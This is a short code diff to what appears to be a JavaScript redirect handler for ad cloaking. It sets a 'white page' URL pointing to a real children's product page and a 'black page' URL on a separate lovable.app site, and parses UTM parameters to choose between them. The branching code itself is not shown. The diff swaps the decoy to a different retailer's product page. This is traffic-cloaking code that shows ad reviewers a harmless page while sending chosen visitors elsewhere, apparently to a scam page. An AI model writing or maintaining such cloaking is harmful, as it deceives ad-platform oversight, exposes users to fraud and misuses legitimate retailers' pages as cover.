@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://mamma-shop.com/products/kidoh-play-mat-in-thick-foam-9-pieces-gra";
-    const blackPageURL = "https://casssshlov.lovable.app";
+    const whitePageURL = "https://www.roba-kids.com/en/collections/door-stair-protection-grilles/products/door-protection-grilles-for-clamping-nature-width-62-106-cm-stair-grids-for-children-pets";
+    const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,4 +26,5 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
